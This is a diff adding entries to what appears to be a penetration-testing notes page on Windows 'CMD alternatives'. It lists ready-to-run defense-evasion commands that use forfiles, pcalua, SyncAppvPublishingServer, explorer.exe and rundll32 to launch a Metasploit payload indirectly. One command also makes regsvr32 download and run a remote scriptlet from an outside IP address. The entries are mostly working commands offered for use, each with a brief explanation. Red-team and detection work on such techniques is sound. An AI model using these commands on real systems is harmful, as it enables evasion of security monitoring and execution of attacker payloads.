@@ -97,9 +97,46 @@ nps.exe -decode {base64_encoded_command}
 
 ## CMD Alternatives
 
+### cmd.dll
+
 {% embed url="https://blog.didierstevens.com/2010/02/04/cmd-dll/" %}
 
 Example:
 
 `rundll32.exe cmd.dll,main` 
+
+### forfiles
+
+The “forfiles” is a command utility which can select multiple files and run a command on them. It is typically used in batch jobs but it could be abused to execute an arbitrary command or an executable. The parameters “/p” and “/m” are used to perform a search in the windows directory “System32” and on the mask “calc.exe” even though the default search mask is \*. Anything after the “/c” parameter is the actual command that is executed.
+
+`forfiles /p c:\windows\system32 /m calc.exe /c C:\tmp\metasploit.exe`
+
+Credit:[https://pentestlab.blog/2020/07/06/indirect-command-execution/](https://pentestlab.blog/2020/07/06/indirect-command-execution/)
+
+### pcalua
+
+The program compatibility assistant is a windows utility that runs when it detects a software with compatibility issues. The utility is located in “C:\Windows\System32” and can execute commands with the “-a” argument.
+
+`pcalua.exe -a C:\tmp\metasploit.exe`
+
+### SyncAppvPublishingServer
+
+The “SyncAppvPublishingServer” initiates the Microsoft application virtualization \(App-V\) publishing refresh operation. However it can be used as a non-directly method to execute commands for evasion. In the example below the execution occurs from PowerShell and the “Start-Process” cmdlet is used to run the executable.
+
+`SyncAppvPublishingServer.vbs "n; Start-Process C:\tmp\metasploit.exe"`
+
+It is also possible to execute a malicious payload from a remote location by using the “regsvr32” method since the “SyncAppvPublishingServer” will execute anything that is enclosed in the double quotes.
+
+```text
+SyncAppvPublishingServer.vbs "Break; regsvr32 /s /n /u /i:http://192.168.254.158:8080/jnQl1FJ.sct scrobj.dll"
+```
+
+### explorer.exe
+
+The “explorer.exe” can be utilized as a method of execution. Furthermore, the executed payload will create a process on the system that will have as a parent process “explore.exe” instead of “cmd.exe“.
+
+```text
+explorer.exe C:\tmp\metasploit.exe 
+explorer.exe /root,"C:\tmp\metasploit.exe" 
+```
 
